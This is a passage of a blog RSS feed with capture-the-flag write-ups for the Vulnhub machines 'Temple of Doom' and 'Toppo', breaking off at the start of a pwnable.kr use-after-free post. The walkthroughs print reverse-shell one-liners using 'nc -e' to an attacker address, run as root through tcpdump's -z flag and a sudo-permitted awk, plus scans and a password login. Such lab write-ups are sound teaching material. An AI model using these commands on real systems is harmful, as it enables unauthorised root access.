&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash 10.0.0.4 6666&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
&amp;lt;eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
tcpdump: listening on eth0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
9 packets received by filter
0 packets dropped by kernel&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And to the flag, here we go!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 6666
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 6666 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 51622
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost fireman]# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 84
dr-xr-x---. 10 root root  4096 Jun  7 23:12 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x. 18 root root  4096 May 30 18:43 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 root root   130 Jun  7 23:21 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root    18 Feb  9 09:26 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   176 Feb  9 09:26 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   176 Feb  9 09:26 .bashrc
drwx------.  3 root root  4096 Jun  1 21:01 .cache
drwxrwx---.  4 root root  4096 May 30 10:42 .config
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   100 Feb  9 09:26 .cshrc
drwx------.  3 root root  4096 May 30 11:21 .dbus
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root    16 May 30 10:42 .esd_auth
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root  1993 Jun  7 23:16 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root 12288 Jun  3 18:18 .flag.txt.swp
drwxr-xr-x   4 root root  4096 Jun  3 01:39 .forever
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 root root  1389 Jun  2 19:47 .mysql_history
drwxr-xr-x.  5 1000 1000  4096 May 30 17:37 .npm
drwxr-----.  3 root root  4096 May 30 11:38 .pki
drwxr-xr-x   2 root root  4096 Jun  1 23:29 .shadowsocks
drwx------   2 root root  4096 Jun  7 22:33 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root     0 May 30 11:21 .Xauthority
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] You&lt;span class=&quot;s1&quot;&gt;'re a soldier. 
[+] One of the best that the world could set against
[+] the demonic invasion.  

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /\|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+
			
		FLAG: kre0cu4jl4rzjicpo1i7z5l1     

[+] Congratulations on completing this VM &amp;amp; I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Fri, 20 Jul 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-temple-of-doom/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-temple-of-doom/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Toppo: 1</title>
        <description>&lt;p&gt;Today we’re going to work through easy machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Toppo&lt;/em&gt;&lt;/strong&gt;. If you don’t have time, but still want to get these shells, just try this machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The Machine isn't hard to own and don't require advanced exploitation .

Level : Beginner

DHCP : activated

Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .

If you have any question : my twitter is @h4d3sw0rm

Happy Hacking !&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@h4d3sw0rm&quot;&gt;Hadi Mene&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/toppo_1,245/&quot;&gt;https://www.vulnhub.com/entry/toppo_1,245/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Firstly let’s start with our usual &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan in order to view the open ports on this machine.&lt;/p&gt;

&lt;p&gt;What parameters I’m using?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;-p-&lt;/em&gt; - scan all 65535 ports&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.0.0.6
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-12 12:38 EDT
NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating ARP Ping Scan at 12:38
Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 12:38, 0.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 12:38
Completed Parallel DNS resolution of 1 host. at 12:38, 0.00s elapsed
Initiating SYN Stealth Scan at 12:38
Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 10.0.0.6
Discovered open port 22/tcp on 10.0.0.6
Discovered open port 111/tcp on 10.0.0.6
Discovered open port 50394/tcp on 10.0.0.6
Completed SYN Stealth Scan at 12:38, 4.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 12:38
Scanning 4 services on 10.0.0.6
Completed Service scan at 12:38, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.6&lt;/span&gt;
NSE: Script scanning 10.0.0.6.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.38s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.01s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.6
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00046s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          49973/udp  status
|_  100024  1          50394/tcp  status
50394/tcp open  status  1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
MAC Address: 08:00:27:C5:CA:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.010 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Thu Jul 12 12:23:50 2018&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Network Distance: 1 hop
TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 10.0.0.6

NSE: Script Post-scanning.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;18.17 seconds
           Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here I can see only one service that’s worth looking at the start, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; running on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;. While looking manually at the website, I decided to run &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; to scan the website.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.6
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.0.6
+ Target Hostname:    10.0.0.6
+ Target Port:        80
+ Start Time:         2018-07-12 12:20:26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Apache/2.4.10 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7517 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 15 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2018-07-12 12:20:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have, an &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; directory. Inside there was a note in &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;URL OF NOTE: http://10.0.0.6/admin/notes.txt

Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At first I thought about enumerating more in order to find the username, as we already have the password. But stupid me overthought this part way too much.&lt;/p&gt;

&lt;p&gt;I didn’t notice that the username is already &lt;strong&gt;&lt;em&gt;in the password&lt;/em&gt;&lt;/strong&gt;. Like what was I thinking, &lt;code class=&quot;highlighter-rouge&quot;&gt;ted&lt;/code&gt; can be the username, and it probably will as this is easy machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh ted@10.0.0.6
ted@10.0.0.6&lt;span class=&quot;s1&quot;&gt;'s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29

ted@Toppo:~$ ls -la
total 24
drwxr-xr-x 2 ted  ted  4096 Jul 16 12:55 .
drwxr-xr-x 3 root root 4096 Apr 15 10:08 ..
-rw------- 1 ted  ted     1 Apr 15 12:33 .bash_history
-rw-r--r-- 1 ted  ted   220 Apr 15 10:08 .bash_logout
-rw-r--r-- 1 ted  ted  3515 Apr 15 10:08 .bashrc
-rw-r--r-- 1 ted  ted   675 Apr 15 10:08 .profile&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Of course that the password works. Now we have to escalate our privilages. Here comes good old &lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;G0tm1k post&lt;/a&gt; and while trying different steps I’ve noticed this entry in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/sudoers
ted &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/awk&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now I decided to check whether &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; is installed on the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which nc
/bin/nc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we can use simple &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function from &lt;code class=&quot;highlighter-rouge&quot;&gt;awk&lt;/code&gt; in order to run the reverse shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'BEGIN {system(&quot;nc -e /bin/sh 10.0.0.4 1337&quot;)}'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can look at the ouputu of the previously started listener.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
10.0.0.6: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.6] 52985
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwx------  2 root root 4096 Apr 15 11:40 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   53 Apr 15 12:28 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  570 Jan 31  2010 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  397 Apr 15 10:19 flag.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Nov 19  2007 .profile
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
_________                                  
|  _   _  |                                 
|_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|.--.   _ .--.   _ .--.    .--.   
    | |  / .&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \/ .'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;
   _| |_ | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | 
  |_____| &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  
                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|              

Congratulations &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; there is your flag : 0wnedlab&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;p4ssi0n_c0me_with_pract1ce&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Mon, 16 Jul 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-toppo/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-toppo/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - uaf</title>
        <description>&lt;p&gt;In this challenge we’re going to cover some basics behind the use-after-free bug in some C++ code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh uaf@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;                                             130 ↵
uaf@pwnable.kr&lt;span class=&quot;s1&quot;&gt;'s password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '&lt;/span&gt; / |  D  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
